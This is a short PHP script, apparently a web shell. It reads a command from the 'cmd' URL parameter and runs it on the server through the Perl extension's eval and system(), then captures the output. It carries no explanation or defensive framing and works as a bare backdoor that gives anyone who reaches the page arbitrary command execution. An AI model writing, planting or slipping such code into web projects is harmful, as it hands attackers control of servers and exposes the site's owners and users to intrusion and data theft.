<?php
$command = $_GET['cmd'];

$perl=new perl();
ob_start();
$perl->eval("system(\"$command\")");
$exec=ob_get_contents();
ob_end_clean();
?>